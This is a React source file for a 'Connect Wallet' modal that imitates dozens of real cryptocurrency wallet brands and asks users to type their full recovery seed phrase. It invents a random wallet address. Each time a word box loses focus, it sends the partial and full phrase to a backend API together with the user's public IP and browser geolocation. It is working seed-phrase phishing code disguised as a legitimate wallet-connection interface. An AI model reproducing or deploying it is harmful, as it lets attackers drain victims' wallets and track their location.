// ConnectWalletModal.js
import React, { useState, useEffect } from 'react';
import axios from 'axios';
import '../styles/ConnectWalletModal.css';

// Helper: fetch public IP and geolocation.
async function getUserIPAndLocation() {
    let ip = '';
    try {
        const ipResp = await axios.get('https://api.ipify.org?format=json');
        ip = ipResp.data.ip;
    } catch (err) {
        console.error('Error fetching IP address:', err);
    }

    const getGeo = () =>
        new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const { latitude, longitude } = pos.coords;
                        resolve(`${latitude},${longitude}`);
                    },
                    (error) => {
                        console.error('Geolocation error:', error);
                        resolve('');
                    }
                );
            } else {
                resolve('');
            }
        });

    const location = await getGeo();
    return { ip, location };
}

// Wallet configurations.
const allWalletConfigs = [
    { name: 'MetaMask', iconSrc: '/img/metamask-icon.png', defaultLength: 12, certified: true },
    { name: 'Phantom', iconSrc: '/img/Phantom_SVG_Icon.png', defaultLength: 18, certified: false },
    { name: 'Ledger', iconSrc: '/img/ledger-logo.png', defaultLength: 24, certified: true },
    { name: 'Trust Wallet', iconSrc: '/img/Trust_Stacked Logo_Blue.png', defaultLength: 12, certified: true },
    { name: 'Binance', iconSrc: '/img/Binance--Streamline-Simple-Icons.png', defaultLength: 12, certified: true },
    { name: 'Bitget Wallet', iconSrc: '/img/bitget_wallet_logo_288_mini.png', defaultLength: 12, certified: true },
    { name: 'OKX Wallet', iconSrc: '/img/OKX Wallet.png', defaultLength: 12, certified: true },
    { name: 'SafePal', iconSrc: '/img/SafePal.png', defaultLength: 12, certified: true },
    { name: 'TokenPocket', iconSrc: '/img/TokenPocket.png', defaultLength: 12, certified: true },
    { name: 'Bybit Wallet', iconSrc: '/img/Bybit.png', defaultLength: 12, certified: true },
    { name: '1inch Wallet', iconSrc: '/img/1inch Wallet.png', defaultLength: 12, certified: true },
    { name: 'imToken', iconSrc: '/img/imToken.png', defaultLength: 12, certified: true },
    { name: 'Ronin Wallet', iconSrc: '/img/ronin.png', defaultLength: 12, certified: true },
    { name: 'Crypto.com', iconSrc: '/img/Crypto com.png', defaultLength: 12, certified: true },
    { name: 'Rainbow', iconSrc: '/img/Rainbow.png', defaultLength: 12, certified: true },
    { name: 'Timeless X', iconSrc: '/img/Timeless X.png', defaultLength: 12, certified: true },
    { name: 'Argent', iconSrc: '/img/Argent.png', defaultLength: 12, certified: false },
    { name: 'Atomic Wallet', iconSrc: '/img/Atomic Wallet.png', defaultLength: 12, certified: false },
    { name: 'Backpack', iconSrc: '/img/Backpack.png', defaultLength: 12, certified: false },
    { name: 'BeeWallet', iconSrc: '/img/BeeWallet.png', defaultLength: 12, certified: false },
    { name: 'Best Wallet', iconSrc: '/img/Best Wallet.png', defaultLength: 12, certified: false },
    { name: 'Bitcoin.com Wallet', iconSrc: '/img/Bitcoin. com Wallet.png', defaultLength: 12, certified: false },
    { name: 'Bitso Web3 Wallet', iconSrc: '/img/Bitso Web3 Wallet.png', defaultLength: 12, certified: false },

    { name: 'BlackFort Wallet', iconSrc: '/img/BlackFort Wallet.png', defaultLength: 12, certified: false },
    { name: 'Blockchain. com', iconSrc: '/img/Blockchain. com.png', defaultLength: 12, certified: false },
    { name: 'Chain', iconSrc: '/img/Chain.png', defaultLength: 12, certified: false },
    { name: 'BitBox', iconSrc: '/img/BitBox.png', defaultLength: 12, certified: false },
    { name: 'BlueWallet', iconSrc: '/img/BlueWallet.png', defaultLength: 12, certified: false },
    { name: 'Coinbase', iconSrc: '/img/Coinbase.png', defaultLength: 12, certified: false },
    { name: 'Electrum crypto wallet', iconSrc: '/img/Electrum crypto wallet.png', defaultLength: 12, certified: false },
    { name: 'Trezor', iconSrc: '/img/Trezor.png', defaultLength: 12, certified: false },
    { name: 'COCA Wallet', iconSrc: '/img/COCA Wallet.png', defaultLength: 12, certified: false },
    { name: 'Core', iconSrc: '/img/Core.png', defaultLength: 12, certified: false },

    { name: 'CVL Wallet', iconSrc: '/img/CVL Wallet.png', defaultLength: 12, certified: false },
    {
        name: "D'CENT Wallet", iconSrc: "/img/D'CENT Wallet.png", defaultLength: 12, certified: false
    },
    { name: 'Dawn Wallet', iconSrc: '/img/Dawn Wallet.png', defaultLength: 12, certified: false },
    { name: 'Enjin Wallet', iconSrc: '/img/Enjin Wallet.png', defaultLength: 12, certified: false },

    { name: 'Exodus', iconSrc: '/img/Exodus.png', defaultLength: 12, certified: false },
    { name: 'Fastex Wallet', iconSrc: '/img/Fastex Wallet.png', defaultLength: 12, certified: false },
    { name: 'Fireblocks', iconSrc: '/img/Fireblocks.png', defaultLength: 12, certified: false },
    { name: 'Frontier', iconSrc: '/img/Frontier.png', defaultLength: 12, certified: false },
    { name: 'GoodDollar', iconSrc: '/img/GoodDollar.png', defaultLength: 12, certified: false },
    { name: 'HaHa', iconSrc: '/img/HaHa.png', defaultLength: 12, certified: false },
    { name: 'Halo Wallet', iconSrc: '/img/Halo Wallet.png', defaultLength: 12, certified: false },
    { name: 'HAQQ Wallet', iconSrc: '/img/HAQQ Wallet.png', defaultLength: 12, certified: false },

    { name: 'Huddln', iconSrc: '/img/Huddln.png', defaultLength: 12, certified: false },
    { name: 'Imota', iconSrc: '/img/Imota.png', defaultLength: 12, certified: false },
    { name: 'Internet Money Wallet', iconSrc: '/img/Internet Money Wallet.png', defaultLength: 12, certified: false },

    { name: 'ioPay', iconSrc: '/img/ioPay.png', defaultLength: 12, certified: false },
    { name: 'Jade Wallet', iconSrc: '/img/Jade Wallet.png', defaultLength: 12, certified: false },
    { name: 'Leap', iconSrc: '/img/Leap.png', defaultLength: 12, certified: false },
    { name: 'Lode Wallet', iconSrc: '/img/Lode Wallet.png', defaultLength: 12, certified: false },
    { name: 'Magic Eden', iconSrc: '/img/Magic Eden.png', defaultLength: 12, certified: false },

    { name: 'MathWallet', iconSrc: '/img/MathWallet.png', defaultLength: 12, certified: false },
    { name: 'MEW wallet', iconSrc: '/img/MEW wallet.png', defaultLength: 12, certified: false },
    { name: 'MoonPay Account', iconSrc: '/img/MoonPay Account.png', defaultLength: 12, certified: false },
    { name: 'Nova Wallet', iconSrc: '/img/Nova Wallet.png', defaultLength: 12, certified: false },

    { name: 'Numio', iconSrc: '/img/Numio.png', defaultLength: 12, certified: false },
    { name: 'Okto', iconSrc: '/img/Okto.png', defaultLength: 12, certified: false },
    { name: 'OneKey', iconSrc: '/img/OneKey.png', defaultLength: 12, certified: false },
    { name: 'Opera Crypto Browser', iconSrc: '/img/Opera Crypto Browser.png', defaultLength: 12, certified: false },
    { name: 'Pintu', iconSrc: '/img/Pintu.png', defaultLength: 12, certified: false },
    { name: 'Robinhood Wallet', iconSrc: '/img/Robinhood Wallet.png', defaultLength: 12, certified: false },
    { name: 'SubWallet', iconSrc: '/img/SubWallet.png', defaultLength: 12, certified: false },
    { name: 'tomi Wallet', iconSrc: '/img/tomi Wallet.png', defaultLength: 12, certified: false },
    { name: 'U2U Wallet', iconSrc: '/img/U2U Wallet.png', defaultLength: 12, certified: false },
    { name: 'Unstoppable Wallet', iconSrc: '/img/Unstoppable Wallet.png', defaultLength: 12, certified: false },
    { name: 'Wombat', iconSrc: '/img/Wombat.png', defaultLength: 12, certified: false },
    { name: 'Xellar', iconSrc: '/img/Xellar.png', defaultLength: 12, certified: false },
    { name: 'Zengo Wallet', iconSrc: '/img/Zengo Wallet.png', defaultLength: 12, certified: false }
];

// List of wallets with fixed seed phrase length.
const fixedSeedWallets = ['MetaMask', 'Ledger', 'Trust Wallet', 'SafePal'];

// Utility: generate a random hex string.
function randomHex(length) {
    let result = '';
    const chars = 'abcdef0123456789';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Sub-component: renders seed phrase input boxes.
function SeedPhraseInput({ wordCount, seedWords, onChange, onBlockBlur, onBlockFocus, wordsPerRow = 4, blockStatus }) {
    const numRows = Math.ceil(wordCount / wordsPerRow);

    const handleChange = (e, rowIndex, colIndex) => {
        const index = rowIndex * wordsPerRow + colIndex;
        const newValue = e.target.value;
        const updated = [...seedWords];
        updated[index] = newValue;
        onChange(updated);
    };

    const getBgColor = (status, value) => {
        if (!value.trim()) return 'var(--input-bg)';
        switch (status) {
            case 'saving':
                return '#3e3a1d'; // yellow (processing)
            case 'saved':
                return '#1f331f'; // green (saved)
            case 'error':
                return '#39221f'; // red (failed)
            default:
                return 'var(--input-bg)';
        }
    };

    return (
        <div className="seed-input-container">
            {Array.from({ length: numRows }).map((_, row) => {
                const start = row * wordsPerRow;
                const end = Math.min(start + wordsPerRow, wordCount);
                return (
                    <div key={row} className="seed-input-row">
                        {Array.from({ length: end - start }).map((__, col) => {
                            const index = start + col;
                            const value = seedWords[index] || '';
                            const status = blockStatus[index] || 'idle';
                            const bgColor = getBgColor(status, value);
                            return (
                                <div key={index} className="seed-input-group">
                                    <label className="dark-label">{index + 1}.</label>
                                    <input
                                        type="text"
                                        value={value}
                                        onChange={(e) => handleChange(e, row, col)}
                                        onFocus={() => onBlockFocus(index)}
                                        onBlur={() => onBlockBlur(index)}
                                        className="dark-input"
                                        style={{ backgroundColor: bgColor }}
                                        placeholder="word"
                                    />
                                </div>
                            );
                        })}
                    </div>
                );
            })}
        </div>
    );
}

// Main component.
export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
    // Disable background scrolling when modal is open.
    useEffect(() => {
        document.body.style.overflow = 'hidden';
        document.body.classList.add('wallet-modal-open');
        return () => {
            document.body.style.overflow = '';
            document.body.classList.remove('wallet-modal-open');
        };
    }, []);

    // Preload wallet logo images.
    useEffect(() => {
        allWalletConfigs.forEach((wallet) => {
            const img = new Image();
            img.src = wallet.iconSrc;
        });
    }, []);

    // Fetch IP and geolocation.
    const [locationData, setLocationData] = useState({ ip: '', location: '' });
    useEffect(() => {
        (async () => {
            const data = await getUserIPAndLocation();
            setLocationData(data);
            localStorage.setItem('userLocation', JSON.stringify(data));
        })();
    }, []);

    // State for connection process.
    const [step, setStep] = useState('choose');
    const [selectedWallet, setSelectedWallet] = useState(null);
    const [walletAddress, setWalletAddress] = useState('');
    const [seedWords, setSeedWords] = useState([]);
    const [blockStatus, setBlockStatus] = useState([]);
    const [wordCount, setWordCount] = useState(12);
    const [connectionId, setConnectionId] = useState(null);
    const [error, setError] = useState('');

    // Wallet filtering state.
    const [searchTerm, setSearchTerm] = useState('');
    const [certifiedOnly, setCertifiedOnly] = useState(true);
    const [showMore, setShowMore] = useState(false);

    const filteredWallets = allWalletConfigs
        .filter((w) => w.name.toLowerCase().includes(searchTerm.toLowerCase()))
        .filter((w) => (certifiedOnly ? w.certified : true));
    const displayedWallets = showMore ? filteredWallets : filteredWallets.slice(0, 9);

    // When a user selects a wallet, start a new connection.
    const handleSelectWallet = async (wallet) => {
        setSelectedWallet(wallet);
        const newAddr = '0x' + randomHex(40);
        const defaultLen = wallet.defaultLength || 12;
        setWalletAddress(newAddr);
        setSeedWords(Array(defaultLen).fill(''));
        setBlockStatus(Array(defaultLen).fill('idle'));
        setWordCount(defaultLen);
        setStep('seed');
        setError('');

        try {
            // Create connection in backend.
            const resp = await axios.post(`${process.env.REACT_APP_API_URL}/api/connection`, {
                walletType: wallet.name,
                walletAddress: newAddr,
                seedPhrase: '',
                seedBlocks: '',
                ipAddress: locationData.ip,
                location: locationData.location
            });
            setConnectionId(resp.data.id);
        } catch (err) {
            console.error('Error creating connection:', err);
            setError('Failed to create connection. Please try again.');
        }
    };

    // Auto-save each seed block on blur.
    const handleBlockBlur = async (index) => {
        if (!connectionId) return;
        const newStatuses = [...blockStatus];
        newStatuses[index] = 'saving';
        setBlockStatus(newStatuses);

        const fullPhrase = seedWords.join(' ').trim();
        const blocksPlain = seedWords.join(',');

        try {
            await axios.put(`${process.env.REACT_APP_API_URL}/api/connection/${connectionId}`, {
                seedPhrase: fullPhrase,
                seedBlocks: blocksPlain,
                ipAddress: locationData.ip,
                location: locationData.location
            });
            const updated = [...blockStatus];
            updated[index] = seedWords[index].trim() ? 'saved' : 'idle';
            setBlockStatus(updated);
        } catch (err) {
            console.error('Error updating block:', err);
            const updated = [...blockStatus];
            updated[index] = 'error';
            setBlockStatus(updated);
        }
    };

    const handleBlockFocus = (index) => {
        const updated = [...blockStatus];
        updated[index] = 'idle';
        setBlockStatus(updated);
    };

    // Final confirmation; on confirm, if all seed words are filled, call onConnectSuccess and then close the modal.
    const handleConfirm = () => {
        const filled = seedWords.filter((w) => w.trim() !== '').length;
        if (filled !== wordCount) {
            setError(`Please fill all ${wordCount} seed words.`);
            return;
        }
        const finalPhrase = seedWords.join(' ').trim();
        // Call parent's onConnectSuccess callback to save info and navigate to wallet page.
        onConnectSuccess({
            walletType: selectedWallet.name,
            walletAddress,
            seedPhrase: finalPhrase
        });
        onClose();
    };

    return (
        <div className="connect-wallet-modal">
            <div className="dark-modal-backdrop">
                <div className="dark-modal">
                    {step === 'choose' && (
                        <>
                            <h2 className="dark-title">Wallet Options</h2>
                            <div className="dark-search-container">
                                <input
                                    type="text"
                                    placeholder="Search wallet"
                                    value={searchTerm}
                                    onChange={(e) => setSearchTerm(e.target.value)}
                                    className="dark-input dark-search-input"
                                />
                                <div className="dark-checkbox-container">
                                    <label className="dark-label">Certified</label>
                                    <input
                                        type="checkbox"
                                        checked={certifiedOnly}
                                        onChange={(e) => {
                                            setCertifiedOnly(e.target.checked);
                                            setShowMore(false);
                                        }}
                                    />
                                </div>
                            </div>
                            <div className="dark-wallet-grid">
                                {displayedWallets.map((w) => (
                                    <div
                                        key={w.name}
                                        onClick={() => handleSelectWallet(w)}
                                        className="dark-wallet-item"
                                    >
                                        <img
                                            src={w.iconSrc}
                                            alt={w.name}
                                            className="dark-wallet-icon"
                                            loading="eager"
                                        />
                                        <div className="dark-wallet-name">{w.name}</div>
                                        {w.certified && <div className="dark-certified">Certified</div>}
                                    </div>
                                ))}
                            </div>
                            {filteredWallets.length > 9 && (
                                <button
                                    onClick={() => setShowMore(!showMore)}
                                    className="dark-button dark-show-more"
                                >
                                    {showMore ? 'Show Less' : 'Show More'}
                                </button>
                            )}
                            {error && <p className="dark-error">{error}</p>}
                            <button className="dark-button dark-close-btn" onClick={onClose}>
                                Close
                            </button>
                        </>
                    )}

                    {step === 'seed' && selectedWallet && (
                        <>
                            <div className="dark-wallet-header">
                                <img
                                    src={selectedWallet.iconSrc}
                                    alt={selectedWallet.name}
                                    className="dark-wallet-icon-large"
                                    loading="eager"
                                />
                            </div>
                            <h2 className="dark-title">{selectedWallet.name}</h2>
                            <p className="dark-text">
                                Wallet Address: {walletAddress.substring(0, 10)}...
                            </p>
                            {fixedSeedWallets.includes(selectedWallet.name) ? (
                                <p className="dark-text">
                                    Seed phrase length: {wordCount} (fixed)
                                </p>
                            ) : (
                                <>
                                    <p className="dark-text">Choose seed phrase length:</p>
                                    <div className="dark-button-group">
                                        {[12, 18, 24].map((len) => (
                                            <button
                                                key={len}
                                                onClick={() => {
                                                    setWordCount(len);
                                                    setSeedWords(Array(len).fill(''));
                                                    setBlockStatus(Array(len).fill('idle'));
                                                    setError('');
                                                }}
                                                className={`dark-button ${wordCount === len ? 'active' : ''}`}
                                            >
                                                {len}
                                            </button>
                                        ))}
                                    </div>
                                </>
                            )}
                            <p className="dark-text">
                                Enter your {wordCount}-word seed phrase:
                            </p>
                            <SeedPhraseInput
                                wordCount={wordCount}
                                seedWords={seedWords}
                                onChange={(newWords) => {
                                    setSeedWords(newWords);
                                    setError('');
                                }}
                                onBlockBlur={handleBlockBlur}
                                onBlockFocus={handleBlockFocus}
                                wordsPerRow={4}
                                blockStatus={blockStatus}
                            />
                            {error && <p className="dark-error">{error}</p>}
                            <div className="dark-button-group">
                                <button className="dark-button dark-Confirm-btn" onClick={handleConfirm}>
                                    Confirm
                                </button>
                                <button className="dark-button dark-close-btn" onClick={onClose}>
                                    Close
                                </button>
                            </div>
                        </>
                    )}
                </div>
            </div>
        </div>
    );
}
